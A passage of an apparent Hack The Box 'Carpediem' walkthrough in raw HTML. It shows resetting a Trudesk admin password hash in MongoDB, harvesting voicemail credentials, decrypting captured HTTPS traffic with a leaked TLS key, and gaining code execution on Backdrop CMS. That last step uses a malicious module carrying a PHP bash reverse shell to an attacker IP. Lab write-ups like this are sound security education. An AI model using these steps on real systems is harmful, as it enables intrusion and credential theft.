+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/…/hackthebox/hackthebox/machines/carpediem<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ python3 script.py
+</span></span><span class="line"><span class="cl">b<span class="s1">&#39;$2b$10$0bHoqmpfWmyu0.Q7T/LTd.CZGKcYH8vieKDxPPEi9Jdhr9Qfx5sGC&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now updating the db entry,</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">trudesk&gt; db.accounts.update<span class="o">(</span> <span class="o">{</span><span class="s2">&#34;_id&#34;</span>: ObjectId<span class="o">(</span><span class="s2">&#34;623c8b20855cc5001a8ba13c&#34;</span><span class="o">)}</span>, <span class="o">{</span><span class="nv">$set</span>: <span class="o">{</span><span class="s2">&#34;password&#34;</span>: <span class="s2">&#34;</span><span class="nv">$2</span><span class="s2">b</span><span class="nv">$10$0</span><span class="s2">bHoqmpfWmyu0.Q7T/LTd.CZGKcYH8vieKDxPPEi9Jdhr9Qfx5sGC&#34;</span><span class="o">}})</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/hackthebox-carpediem/27.png" title="Updated Entry" data-thumbnail="/hackthebox-carpediem/27.png" data-sub-html="<h2>Updated Entry</h2><p>Updated Entry</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-carpediem/27.png"
+            data-srcset="/hackthebox-carpediem/27.png, /hackthebox-carpediem/27.png 1.5x, /hackthebox-carpediem/27.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-carpediem/27.png" width="1920" height="581" />
+    </a><figcaption class="image-caption">Updated Entry</figcaption>
+    </figure></p>
+<p>We can now login to <code>trudesk</code> with credentials <code>admin:supersecretpassword</code>.</p>
+<p>Logging in we get the dashboard.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-carpediem/28.png" title="Trudesk Dashboard" data-thumbnail="/hackthebox-carpediem/28.png" data-sub-html="<h2>Trudesk Dashboard</h2><p>Trudesk Dashboard</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-carpediem/28.png"
+            data-srcset="/hackthebox-carpediem/28.png, /hackthebox-carpediem/28.png 1.5x, /hackthebox-carpediem/28.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-carpediem/28.png" width="1920" height="871" />
+    </a><figcaption class="image-caption">Trudesk Dashboard</figcaption>
+    </figure></p>
+<h3 id="listening-to-the-credentials">Listening to the credentials</h3>
+<p>Looking around on the Active Tickets page, we have a ticket regarding new employee on-boarding.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-carpediem/29.png" title="new employee" data-thumbnail="/hackthebox-carpediem/29.png" data-sub-html="<h2>new employee</h2><p>new employee</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-carpediem/29.png"
+            data-srcset="/hackthebox-carpediem/29.png, /hackthebox-carpediem/29.png 1.5x, /hackthebox-carpediem/29.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-carpediem/29.png" width="1920" height="861" />
+    </a><figcaption class="image-caption">new employee</figcaption>
+    </figure></p>
+<p>In the mail it is mentioned that the new employee <code>Horace Flaccus</code> will get his credentials on a voicemail. It is also mentioned that they&rsquo;ve been using <code>zoiper</code> client to do the process.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-carpediem/30.png" title="mail" data-thumbnail="/hackthebox-carpediem/30.png" data-sub-html="<h2>mail</h2><p>mail</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-carpediem/30.png"
+            data-srcset="/hackthebox-carpediem/30.png, /hackthebox-carpediem/30.png 1.5x, /hackthebox-carpediem/30.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-carpediem/30.png" width="1920" height="858" />
+    </a><figcaption class="image-caption">mail</figcaption>
+    </figure></p>
+<p>We can download the <code>zoiper</code> client and perform the mentioned process to get the credentials.</p>
+<p>After downloading the zoiper client, we can use above mentioned credentials <code>9650:2022</code> and <code>carpediem.htb</code> as domain.</p>
+<p>Simply dialing a call to <code>*62</code> we can listen to the credentials.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-carpediem/31.png" title="zoiper client" data-thumbnail="/hackthebox-carpediem/31.png" data-sub-html="<h2>zoiper client</h2><p>zoiper client</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-carpediem/31.png"
+            data-srcset="/hackthebox-carpediem/31.png, /hackthebox-carpediem/31.png 1.5x, /hackthebox-carpediem/31.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-carpediem/31.png" width="1920" height="906" />
+    </a><figcaption class="image-caption">zoiper client</figcaption>
+    </figure></p>
+<p>From the obtained credentials, we can login as <code>hflaccus</code> to <code>ssh</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/…/hackthebox/hackthebox/machines/carpediem<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ ssh hflaccus@carpediem.htb                                 
+</span></span><span class="line"><span class="cl">hflaccus@carpediem.htb<span class="err">&#39;</span>s password: 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">hflaccus@carpediem:~$ whoami
+</span></span><span class="line"><span class="cl">hflaccus
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">hflaccus@carpediem:~$ 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="usertxt">user.txt</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hflaccus@carpediem:~$ ls -al
+</span></span><span class="line"><span class="cl">total <span class="m">32</span>
+</span></span><span class="line"><span class="cl">drwxr-x--- <span class="m">4</span> hflaccus hflaccus <span class="m">4096</span> May <span class="m">26</span> 14:34 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">6</span> root     root     <span class="m">4096</span> May <span class="m">26</span> 14:34 ..
+</span></span><span class="line"><span class="cl">lrwxrwxrwx <span class="m">1</span> hflaccus hflaccus    <span class="m">9</span> Apr  <span class="m">1</span>  <span class="m">2022</span> .bash_history -&gt; /dev/null
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> hflaccus hflaccus  <span class="m">220</span> Feb <span class="m">25</span>  <span class="m">2020</span> .bash_logout
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> hflaccus hflaccus <span class="m">3771</span> Feb <span class="m">25</span>  <span class="m">2020</span> .bashrc
+</span></span><span class="line"><span class="cl">drwx------ <span class="m">2</span> hflaccus hflaccus <span class="m">4096</span> May <span class="m">26</span> 14:34 .cache
+</span></span><span class="line"><span class="cl">drwxrwxr-x <span class="m">3</span> hflaccus hflaccus <span class="m">4096</span> May <span class="m">26</span> 14:34 .local
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> hflaccus hflaccus  <span class="m">807</span> Feb <span class="m">25</span>  <span class="m">2020</span> .profile
+</span></span><span class="line"><span class="cl">-rw-r----- <span class="m">1</span> root     hflaccus   <span class="m">33</span> Nov  <span class="m">1</span> 05:23 user.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">hflaccus@carpediem:~$ cat user.txt 
+</span></span><span class="line"><span class="cl">37****************************2c
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">hflaccus@carpediem:~$ 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>Looking at the capabilities, we have <code>tcpdump</code> capability enabled.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-carpediem/32.png" title="tcpdump cap" data-thumbnail="/hackthebox-carpediem/32.png" data-sub-html="<h2>tcpdump cap</h2><p>tcpdump cap</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-carpediem/32.png"
+            data-srcset="/hackthebox-carpediem/32.png, /hackthebox-carpediem/32.png 1.5x, /hackthebox-carpediem/32.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-carpediem/32.png" width="1920" height="117" />
+    </a><figcaption class="image-caption">tcpdump cap</figcaption>
+    </figure></p>
+<p>Also, linpeas output showed ssl cert key for the site <code>backdrop.carpediem.htb</code>.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-carpediem/33.png" title="linpeas ssl cert" data-thumbnail="/hackthebox-carpediem/33.png" data-sub-html="<h2>linpeas ssl cert</h2><p>linpeas ssl cert</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-carpediem/33.png"
+            data-srcset="/hackthebox-carpediem/33.png, /hackthebox-carpediem/33.png 1.5x, /hackthebox-carpediem/33.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-carpediem/33.png" width="1919" height="541" />
+    </a><figcaption class="image-caption">linpeas ssl cert</figcaption>
+    </figure></p>
+<p>So we can try capturing the https traffic from <code>tcpdump</code> as we have the mechanism to decrypt the traffic.</p>
+<h3 id="analyzing-the-https-traffic">Analyzing the https traffic</h3>
+<p>First we need to capture the traffic for about 2 minutes.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hflaccus@carpediem:/tmp$ tcpdump -i docker0 port <span class="m">443</span> -w cap.pcap
+</span></span><span class="line"><span class="cl">tcpdump: listening on docker0, link-type EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>, capture size <span class="m">262144</span> bytes
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Then transfer the <code>cap.pcap</code> file and <code>/etc/ssl/certs/backdrop.carpediem.htb.key</code> file to our machine.</p>
+<p>Now fire-up the <code>wireshark</code>, add the decryption key and read the <code>TLSv1.2</code> streams.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-carpediem/34.png" title="tls stream" data-thumbnail="/hackthebox-carpediem/34.png" data-sub-html="<h2>tls stream</h2><p>tls stream</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-carpediem/34.png"
+            data-srcset="/hackthebox-carpediem/34.png, /hackthebox-carpediem/34.png 1.5x, /hackthebox-carpediem/34.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-carpediem/34.png" width="1920" height="629" />
+    </a><figcaption class="image-caption">tls stream</figcaption>
+    </figure></p>
+<p>Boom! We got some more credentials.</p>
+<p>These creds are for <code>backrop.carpediem.htb</code> site we found earlier.</p>
+<h3 id="ssh-tunneling">SSH tunneling</h3>
+<p>As we found earlier, <code>backrop</code> website is running on <code>172.17.0.2</code> port <code>443</code> so we can use ssh tunneling this time to forward that port.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/…/hackthebox/machines/carpediem/pcaps<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ ssh -L 443:172.17.0.2:443 hflaccus@carpediem.htb
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/hackthebox-carpediem/35.png" title="backrop.carpediem.htb" data-thumbnail="/hackthebox-carpediem/35.png" data-sub-html="<h2>backdrop.carpediem.htb</h2><p>backrop.carpediem.htb</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-carpediem/35.png"
+            data-srcset="/hackthebox-carpediem/35.png, /hackthebox-carpediem/35.png 1.5x, /hackthebox-carpediem/35.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-carpediem/35.png" width="1920" height="868" />
+    </a><figcaption class="image-caption">backdrop.carpediem.htb</figcaption>
+    </figure></p>
+<p>Successfully logged in as <code>jpardella</code>.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-carpediem/36.png" title="backdrop dashboard" data-thumbnail="/hackthebox-carpediem/36.png" data-sub-html="<h2>backdrop dashboard</h2><p>backdrop dashboard</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-carpediem/36.png"
+            data-srcset="/hackthebox-carpediem/36.png, /hackthebox-carpediem/36.png 1.5x, /hackthebox-carpediem/36.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-carpediem/36.png" width="1920" height="871" />
+    </a><figcaption class="image-caption">backdrop dashboard</figcaption>
+    </figure></p>
+<h3 id="exploiting-backdrop-cms">Exploiting Backdrop CMS</h3>
+<p>Looking for backrop CMS exploits, we found <a href="https://github.com/V1n1v131r4/CSRF-to-RCE-on-Backdrop-CMS" target="_blank" rel="noopener noreffer ">this</a> article.</p>
+<p>Following this vulnerability, we can upload a malicious <code>tar</code> file as a module and get <code>RCE</code>.</p>
+<p>Download the <code>reference.tar</code> binary from <a href="https://github.com/V1n1v131r4/CSRF-to-RCE-on-Backdrop-CMS/releases/tag/backdrop" target="_blank" rel="noopener noreffer ">here</a>. Untar it and modify the <code>shell.php</code> file as follows.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/…/hackthebox/hackthebox/machines/carpediem<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ cat reference/shell.php 
+</span></span><span class="line"><span class="cl">&lt;?php system<span class="o">(</span><span class="s2">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.46/4444 0&gt;&amp;1&#39;&#34;</span><span class="o">)</span><span class="p">;</span>?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Add a new module at <code>https://127.0.0.1/?q=admin/modules/install</code>. Then select manual installation.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-carpediem/37.png" title="manual installation" data-thumbnail="/hackthebox-carpediem/37.png" data-sub-html="<h2>manual installation</h2><p>manual installation</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-carpediem/37.png"
+            data-srcset="/hackthebox-carpediem/37.png, /hackthebox-carpediem/37.png 1.5x, /hackthebox-carpediem/37.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-carpediem/37.png" width="1919" height="874" />
+    </a><figcaption class="image-caption">manual installation</figcaption>
+    </figure></p>
+<p>Upload the malicious <code>reference.tar</code> file.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-carpediem/38.png" title="upload the file" data-thumbnail="/hackthebox-carpediem/38.png" data-sub-html="<h2>upload the file</h2><p>upload the file</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-carpediem/38.png"
+            data-srcset="/hackthebox-carpediem/38.png, /hackthebox-carpediem/38.png 1.5x, /hackthebox-carpediem/38.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-carpediem/38.png" width="1919" height="866" />
+    </a><figcaption class="image-caption">upload the file</figcaption>
+    </figure></p>
+<p>Enable the newly added module.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-carpediem/39.png" title="enable the module" data-thumbnail="/hackthebox-carpediem/39.png" data-sub-html="<h2>enable the module</h2><p>enable the module</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-carpediem/39.png"
+            data-srcset="/hackthebox-carpediem/39.png, /hackthebox-carpediem/39.png 1.5x, /hackthebox-carpediem/39.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-carpediem/39.png" width="1920" height="868" />
+    </a><figcaption class="image-caption">enable the module</figcaption>
+    </figure></p>
+<h3 id="shell-as-www-data-on-1721702">Shell as www-data on 172.17.0.2</h3>
+<p>Now start a <code>netcat</code> listener on port <code>4444</code> &amp; visit the <code>shell.php</code> file.</p>
+<p>And we got the shell as <code>www-data</code>.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-carpediem/40.png" title="shell as www-data" data-thumbnail="/hackthebox-carpediem/40.png" data-sub-html="<h2>shell as www-data</h2><p>shell as www-data</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-carpediem/40.png"
+            data-srcset="/hackthebox-carpediem/40.png, /hackthebox-carpediem/40.png 1.5x, /hackthebox-carpediem/40.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-carpediem/40.png" width="1920" height="198" />
+    </a><figcaption class="image-caption">shell as www-data</figcaption>
+    </figure></p>
+<h3 id="www-data---root-in-the-same-container">www-data -&gt; root in the same container</h3>
+<p>Looking around in the <code>/opt</code> directory, we have a file <code>heartbeat.sh</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">www-data@90c7f522b842:/opt$ cat heartbeat.sh
+</span></span><span class="line"><span class="cl">cat heartbeat.sh
+</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#Run a site availability check every 10 seconds via cron</span>
+</span></span><span class="line"><span class="cl"><span class="nv">checksum</span><span class="o">=(</span><span class="k">$(</span>/usr/bin/md5sum /var/www/html/backdrop/core/scripts/backdrop.sh<span class="k">)</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[[</span> <span class="nv">$checksum</span> !<span class="o">=</span> <span class="s2">&#34;70a121c0202a33567101e2330c069b34&#34;</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">exit</span>
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>
+</span></span><span class="line"><span class="cl"><span class="nv">status</span><span class="o">=</span><span class="k">$(</span>php /var/www/html/backdrop/core/scripts/backdrop.sh --root /var/www/html/backdrop https://localhost<span class="k">)</span>
+</span></span><span class="line"><span class="cl">grep <span class="s2">&#34;Welcome to backdrop.carpediem.htb!&#34;</span> <span class="s2">&#34;</span><span class="nv">$status</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[[</span> <span class="s2">&#34;</span><span class="nv">$?</span><span class="s2">&#34;</span> !<span class="o">=</span> <span class="m">0</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">#something went wrong.  restoring from backup.</span>
+</span></span><span class="line"><span class="cl">        cp /root/index.php /var/www/html/backdrop/index.php
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>
+</span></span><span class="line"><span class="cl">www-data@90c7f522b842:/opt$
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>In this script, it is calling the <code>backdrop.sh</code> file.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">www-data@90c7f522b842:/var/www/html/backdrop$ cat core/scripts/backdrop.sh
+</span></span><span class="line"><span class="cl">cat core/scripts/backdrop.sh
+</span></span><span class="line"><span class="cl"><span class="c1">#!/usr/bin/env php</span>
+</span></span><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/**
+</span></span><span class="line"><span class="cl"> * Backdrop shell execution script
+</span></span><span class="line"><span class="cl"> *
+</span></span><span class="line"><span class="cl"> * Check <span class="k">for</span> your PHP interpreter - on Windows you<span class="s1">&#39;ll probably have to
+</span></span></span><span class="line"><span class="cl"><span class="s1"> * replace line 1 with
+</span></span></span><span class="line"><span class="cl"><span class="s1"> *   #!c:/program files/php/php.exe
+</span></span></span><span class="line"><span class="cl"><span class="s1"> *
+</span></span></span><span class="line"><span class="cl"><span class="s1"> * @param path  Backdrop&#39;</span>s absolute root directory in <span class="nb">local</span> file system <span class="o">(</span>optional<span class="o">)</span>.
+</span></span><span class="line"><span class="cl"> * @param URI   A URI to execute, including HTTP protocol prefix.
+</span></span><span class="line"><span class="cl"> */
+</span></span><span class="line"><span class="cl"><span class="nv">$script</span> <span class="o">=</span> basename<span class="o">(</span>array_shift<span class="o">(</span><span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">&#39;argv&#39;</span><span class="o">]))</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">(</span>in_array<span class="o">(</span><span class="s1">&#39;--help&#39;</span>, <span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">&#39;argv&#39;</span><span class="o">])</span> <span class="o">||</span> empty<span class="o">(</span><span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">&#39;argv&#39;</span><span class="o">]))</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">echo</span> <span class="o">&lt;&lt;&lt;</span>EOF
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Execute a Backdrop page from the shell.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Usage:        <span class="o">{</span><span class="nv">$script</span><span class="o">}</span> <span class="o">[</span>OPTIONS<span class="o">]</span> <span class="s2">&#34;&lt;URI&gt;&#34;</span>
+</span></span><span class="line"><span class="cl">Example:      <span class="o">{</span><span class="nv">$script</span><span class="o">}</span> <span class="s2">&#34;http://mysite.org/node&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">All arguments are long options.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  --help      This page.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  --root      Set the working directory <span class="k">for</span> the script to the specified path.
+</span></span><span class="line"><span class="cl">              To execute Backdrop this has to be the root directory of your
+</span></span><span class="line"><span class="cl">              Backdrop installation, f.e. /home/www/foo/backdrop <span class="o">(</span>assuming
+</span></span><span class="line"><span class="cl">              Backdrop is running on Unix<span class="o">)</span>. Current directory is not required.
+</span></span><span class="line"><span class="cl">              Use surrounding quotation marks on Windows.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  --verbose   This option displays the options as they are set, but will
+</span></span><span class="line"><span class="cl">              produce errors from setting the session.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  URI         The URI to execute, i.e. http://default/foo/bar <span class="k">for</span> executing
+</span></span><span class="line"><span class="cl">              the path <span class="s1">&#39;/foo/bar&#39;</span> in your site <span class="s1">&#39;default&#39;</span>. URI has to be
+</span></span><span class="line"><span class="cl">              enclosed by quotation marks <span class="k">if</span> there are ampersands in it
